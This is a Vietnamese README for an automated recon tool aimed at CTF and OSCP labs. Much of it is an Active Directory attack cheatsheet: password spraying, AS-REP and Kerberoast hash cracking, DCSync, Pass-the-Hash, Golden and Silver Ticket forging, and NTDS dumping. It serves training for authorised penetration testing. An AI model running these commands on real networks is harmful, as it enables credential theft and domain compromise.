# Auto Recon — Hướng dẫn sử dụng chi tiết (v4.1)

Công cụ recon all-in-one cho **boot2root / CTF / OSCP** (HackTheBox, TryHackMe, OffSec PG, web CTF).
Triết lý: **mọi tool ngoài đều optional** — thiếu tool nào thì tự fallback sang tool khác, không bao giờ chết cứng.

> ⚠️ Chỉ dùng trên lab/đề thi/hệ thống bạn được phép tấn công.

---

## Mục lục
1. [Cài đặt & yêu cầu](#1-cài-đặt--yêu-cầu)
2. [Khởi chạy](#2-khởi-chạy)
3. [Menu chính](#3-menu-chính)
4. [Quy trình khuyến nghị](#4-quy-trình-khuyến-nghị)
5. [Xem command khi chạy & file PoC](#5-xem-command-khi-chạy--file-poc)
6. [Cấu trúc thư mục kết quả](#6-cấu-trúc-thư-mục-kết-quả)
7. [🏰 Phần Active Directory (chi tiết)](#7--phần-active-directory-chi-tiết)
8. [Mẹo cho kỳ thi OSCP](#8-mẹo-cho-kỳ-thi-oscp)

---

## 1. Cài đặt & yêu cầu

```bash
git clone https://github.com/canhieu2412/AutoRecon.git
cd AutoRecon
chmod +x auto_recon.sh
```

**Tool nền tảng nên có** (Kali đa số đã có sẵn): `nmap`, `ffuf`/`feroxbuster`/`gobuster`, `curl`, `nc`.

**Tool tăng sức mạnh** (optional — thiếu thì fallback):
- Quét port: `rustscan`, `naabu`, `masscan`
- Web: `httpx-toolkit`, `katana`/`gospider`/`hakrawler`, `gowitness`, `arjun`, `dalfox`, `git-dumper`
- AD: `netexec` (nxc) / `crackmapexec`, `impacket-*`, `bloodhound-python`, `certipy-ad`, `enum4linux-ng`, `ldapsearch`, `rpcclient`, `hashcat`, `evil-winrm`
- Shell: `pwncat-cs`, `ncat`, `rlwrap`, `socat`
- TUI: `gum` → `sudo apt install gum`

Kiểm tra tool nào đang có / thiếu: chạy tool rồi vào mục báo cáo dependency, hoặc xem `lib/tools.sh`.

---

## 2. Khởi chạy

```bash
sudo ./auto_recon.sh                 # chạy menu (nên dùng sudo: cần cho SYN scan, /etc/hosts...)
sudo ./auto_recon.sh 10.10.10.10     # vào thẳng với target
```

**Cờ dòng lệnh:**

| Cờ | Ý nghĩa |
|---|---|
| `--profile <name>` | `balanced` \| `offsec-lab` \| `htb` \| `thm` \| `boot2root` \| `custom` |
| `--offsec-safe` / `--no-offsec-safe` | Bật/tắt chế độ an toàn cho đề thi (ẩn sqlmap/nuclei/relay/dalfox…) |
| `--tui` / `--no-tui` | Ép dùng giao diện gum hoặc menu chữ cổ điển |
| `--help` | Trợ giúp |

**Giao diện**: mặc định `auto` — có `gum` + terminal thật thì bật TUI full-screen, không thì menu chữ. Đổi vĩnh viễn trong `config/config.sh`: `USE_TUI="auto|on|off"`.

---

## 3. Menu chính

| Phím | Chức năng |
|---|---|
| `1` | 🚀 **Full Auto** — chạy toàn bộ pipeline 1 phát (port → service → web → vuln → privesc → AD nếu là DC) |
| `2` | 🔌 Port Scan |
| `4` | 🌐 Web Recon |
| `5` | ⚠️ Vulnerability Scan (nmap scripts + searchsploit) |
| `p` | 🪜 Priv-Esc Handoff (gợi ý CVE + linpeas/winpeas + GTFOBins) |
| `6` | 🔑 Brute / Operator toolkit (hydra…) |
| `h` | 🐚 **Shell Handler** — bắt reverse shell + truyền file 2 chiều |
| `a` | 🏰 **AD Attack Path** — xem mục 7 |
| `w` | 🧬 Wordlist toolkit (CeWL, crunch…) |
| `7` | 📄 Generate Report (Markdown + HTML) |
| `8` | 📂 View Results |

---

## 4. Quy trình khuyến nghị

**Cách nhanh nhất:** đặt target → bấm `1` (Full Auto) → đọc report.

Pipeline Full Auto tự chạy theo thứ tự:
```
Port scan → Service enum → Web recon → Vuln scan → Priv-Esc handoff
          → (nếu phát hiện Domain Controller) → AD Attack Path
```
- Có hệ thống state: phase đã xong sẽ được **tái sử dụng**, chạy lại không tốn thời gian.
- AD **tự kích hoạt** khi host trông giống DC (xem mục 7).

**Cách thủ công** (kiểm soát từng bước): `2` → `4` → `5` → `p`, và `a` nếu là Windows/AD.

---

## 5. Xem command khi chạy & file PoC

Mỗi lệnh tool chạy đều hiện trên màn hình (ra **stderr** nên luôn thấy, kể cả khi output bị ẩn):

```
  ❯ Command: nxc smb 10.10.10.10 -u '' -p '' --users
  <output của lệnh stream ngay bên dưới>
```

Đồng thời **mọi lệnh được gom tự động** vào:
```
results/<target>/commands_poc.txt
```
File này **copy-paste thẳng vào write-up/report** (đã dedup các lệnh trùng liên tiếp). Trong report HTML/MD cũng có section **“Commands Executed (PoC)”** render lại dưới dạng code block bash.

> 💡 Đây chính là thứ bạn cần khi làm PoC: vừa thấy lệnh lúc chạy, vừa có file tổng hợp lệnh.

---

## 6. Cấu trúc thư mục kết quả

```
results/<target>/
├── commands_poc.txt        ← TẤT CẢ lệnh đã chạy (cho PoC)
├── scans/
│   ├── open_ports.txt
│   ├── nmap_targeted.nmap   ← banner/script (nguồn để detect AD)
├── web/                     ← fuzz, crawl, screenshots, js secrets, .git dump
├── vuln/                    ← searchsploit, nmap vuln scripts
├── privesc/                 ← CVE hints + cheatsheet linpeas/winpeas
├── shells/loot/             ← file lấy về từ target
├── ad/                      ← TOÀN BỘ kết quả AD (xem mục 7)
└── report/                  ← report.md + report.html
```

---

## 7. 🏰 Phần Active Directory (chi tiết)

Module: `modules/12_ad_enum.sh`. Hướng theo phương pháp luận chuẩn: **unauth enum → AS-REP → auth enum (Kerberoast/BloodHound/secretsdump) → ADCS → relay → crack → summary**.

### 7.1. Khi nào AD tự bật?
Trong Full Auto, AD chạy khi host giống Domain Controller:
- Mở **port 88** (Kerberos), **hoặc**
- Mở **389/636** (LDAP) **và** **445** (SMB).

Hoặc bạn tự mở bằng phím **`a`** ở menu chính.

### 7.2. Auto vs Interactive
- **Trong Full Auto (không hỏi):** tự chạy `unauth enum → password spray → AS-REP → crack hints → summary`.
- **Khi bấm `a` (interactive):** hiện sub-menu để bạn chọn từng bước (đặc biệt là bước cần credential).

Sub-menu:
```
1  👻 Unauth enum (null/guest/RID/LDAP)
2  🔥 AS-REP roast (no creds)
8  💦 Password spray (dùng users.txt)
3  🔑 Authenticated enum (creds/hash)
4  📜 ADCS (certipy)
5  📡 Relay/Coercion handoff
6  🧮 Crack hints
7  📋 Summary
0  ← Back
```

### 7.3. Stage 1 — Unauth enum (null/guest)
Không cần credential. Dùng `netexec`/`crackmapexec` + fallback `enum4linux-ng`, `rpcclient`, `ldapsearch` anonymous.

Lệnh tiêu biểu (bạn sẽ thấy hiện ra `❯ Command:`):
```bash
nxc smb <ip>                                  # OS / domain / signing
nxc smb <ip> -u '' -p '' --users              # liệt kê user (null session)
nxc smb <ip> -u '' -p '' --rid-brute 4000     # RID brute → user + computer
nxc smb <ip> -u '' -p '' --shares             # share
nxc smb <ip> -u '' -p '' --pass-pol           # password policy
nxc smb <ip> -u 'guest' -p '' --users         # fallback guest
rpcclient -U "" -N <ip> -c enumdomusers
ldapsearch -x -H ldap://<ip> -b "dc=domain,dc=local"
```
→ Gom user về **`ad/users.txt`** (dùng cho AS-REP & spray).

| File | Nội dung |
|---|---|
| `ad/nxc_smb_info.txt` | OS, domain, SMB signing |
| `ad/nxc_users.txt`, `ad/nxc_rid.txt` | user/computer |
| `ad/nxc_shares.txt`, `ad/nxc_passpol.txt` | share, pass policy |
| `ad/users.txt` | **userlist tổng hợp** |

### 7.4. Stage 2 — AS-REP Roasting (không cần creds)
```bash
impacket-GetNPUsers domain/ -no-pass -usersfile ad/users.txt -dc-ip <ip> -format hashcat -outputfile ad/asrep_hashes.txt
```
Crack:
```bash
hashcat -m 18200 ad/asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 7.4b. Password Spraying (tự động — bấm `8`)
Dùng chính `ad/users.txt` để spray, **lockout-aware** (mỗi password thử 1 lượt qua toàn bộ user, không cartesian):
```bash
# 1) username == password
nxc smb <ip> -u ad/users.txt -p ad/users.txt --no-bruteforce --continue-on-success
# 2) list seasonal/common (Spring2026!, Welcome1, P@ssw0rd... — tự sinh theo năm hiện tại)
nxc smb <ip> -u ad/users.txt -p 'Spring2026!' --continue-on-success
```
- ⚠️ **Xem `ad/nxc_passpol.txt` (lockout threshold) trước khi spray** để tránh khoá account.
- Có thể nhập wordlist password riêng khi được hỏi.
- Credential hợp lệ → `ad/spray_hits.txt`. Dùng ngay ở “Authenticated enum” (mục 3).

**Nguồn password list (ưu tiên từ trên xuống):**
1. List seasonal/common dựng sẵn theo năm hiện tại (luôn có).
2. seclists trên máy (`best1050.txt`…).
3. Nếu không có → **tự tải [Cryilllic/Active-Directory-Wordlists](https://github.com/Cryilllic/Active-Directory-Wordlists/)** và cache vào `wordlists/ad_passwords.txt` (chỉ tải 1 lần, cần mạng).

Cap số password để tránh lockout: `AD_SPRAY_MAX` trong `config/config.sh` (mặc định 40). Nhập wordlist riêng thì dùng full không bị cap.

| File | Nội dung |
|---|---|
| `ad/spray_passwords.txt` | list password đã dùng (đã cap) |
| `ad/spray_hits.txt` | **credential tìm được** |
| `ad/spray_run.txt` | log toàn bộ lần spray |
| `wordlists/ad_passwords.txt` | cache AD wordlist tải về (Cryilllic) |

### 7.5. Stage 3 — Authenticated enum (có user/pass hoặc NT hash)
Bấm `3`, nhập **Domain / Username / Password** (bỏ trống pass để nhập **NT hash** — Pass-the-Hash). Tool sẽ chạy:

```bash
nxc smb   <ip> -d DOMAIN -u USER -p PASS                  # (hoặc -H NTHASH)
nxc smb   <ip> -d DOMAIN -u USER -p PASS --shares --users --groups --loggedon-users
nxc smb   <ip> -d DOMAIN -u USER -p PASS -M spider_plus   # lùng creds trong share
nxc winrm <ip> -d DOMAIN -u USER -p PASS                  # check WinRM (Pwn3d!)
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip <ip> -request -outputfile ad/kerberoast_hashes.txt   # Kerberoast
bloodhound-python -d DOMAIN -u USER -p PASS -ns <ip> -c All --zip                                  # BloodHound
impacket-secretsdump DOMAIN/USER:PASS@<ip>                                                         # DCSync nếu đủ quyền
```
- Thấy **`Pwn3d!`** = có quyền admin → nhảy thẳng evil-winrm / psexec / secretsdump.
- Kerberoast crack: `hashcat -m 13100 ad/kerberoast_hashes.txt rockyou.txt`
- BloodHound zip ở `ad/bloodhound/*.zip` → import vào BloodHound GUI tìm đường tới Domain Admin.

### 7.6. Stage 4 — ADCS (certipy)
```bash
certipy-ad find -u USER@DOMAIN -p PASS -dc-ip <ip> -vulnerable -stdout
```
Phát hiện template dính **ESC1–ESC8** → `ad/certipy_find.txt`.

### 7.7. Stage 5 — Relay / Coercion (thủ công, bị gate bởi OffSec-safe)
Sinh lệnh sẵn vào `ad/relay_commands.txt`: `ntlmrelayx`, `PetitPotam`, `coercer`, `mitm6`, `responder`. (Tắt khi `--offsec-safe`.)

### 7.8. Stage 6–7 — Crack hints & Summary
- `ad/crack_hints.txt`: lệnh hashcat cho từng loại hash.
- `ad/summary.txt`: tổng kết domain/user/hash/ADCS/Pwn3d + **next steps**.

### 7.9. Sau khi có creds — cheatsheet thủ công (mở rộng cho PEN-200)
Những kỹ thuật sau là **post-foothold**, nên dùng tay (tham khảo nhanh):

```bash
# Foothold
evil-winrm -i <ip> -u USER -p PASS          # hoặc -H NTHASH (Pass-the-Hash)
impacket-psexec  DOMAIN/USER@<ip> -hashes :NTHASH
impacket-wmiexec DOMAIN/USER@<ip>           # WMI lateral
impacket-dcomexec DOMAIN/USER@<ip>          # DCOM lateral

# Password spraying (PEN-200 hay dùng)
nxc smb <ip> -u ad/users.txt -p 'Season2024!' --continue-on-success

# Overpass-the-Hash / Pass-the-Key → vé Kerberos từ hash
impacket-getTGT DOMAIN/USER -hashes :NTHASH
export KRB5CCNAME=USER.ccache

# Pass-the-Ticket
impacket-psexec -k -no-pass DOMAIN/USER@dc.domain.local

# Silver Ticket (cần hash service account + domain SID)
impacket-ticketer -nthash <SVC_HASH> -domain-sid <SID> -domain DOMAIN -spn cifs/host fakeadmin

# Golden Ticket (cần krbtgt hash từ DCSync)
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain DOMAIN Administrator

# Persistence / dump NTDS qua Shadow Copy (trên DC)
vssadmin create shadow /for=C:
# rồi copy NTDS.dit + SYSTEM → secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

> Các lệnh trên cũng được nhắc trong `ad/summary.txt`. Để tự động hoá thêm (vd auto password-spray ngay trong Stage 1), xem mục 8.

---

## 8. Mẹo cho kỳ thi OSCP

- Dùng `--profile offsec-lab` hoặc `--offsec-safe` để **tránh tool cấm** (sqlmap auto, nuclei, metasploit-mapping, relay).
- **Luôn mở `commands_poc.txt`** song song — đó là nguồn lệnh sạch cho báo cáo.
- AD: ưu tiên `users.txt` → AS-REP/Kerberoast → BloodHound tìm path → secretsdump (DCSync) → Golden Ticket.
- **Password spraying** đã tự động (mục 7.4b) — nhớ check lockout policy trước.
- Sau mỗi máy, bấm `7` để xuất report HTML có cả ảnh chụp web + lệnh PoC.

---

*Auto Recon v4.1 — chỉ dùng cho mục đích được phép.*
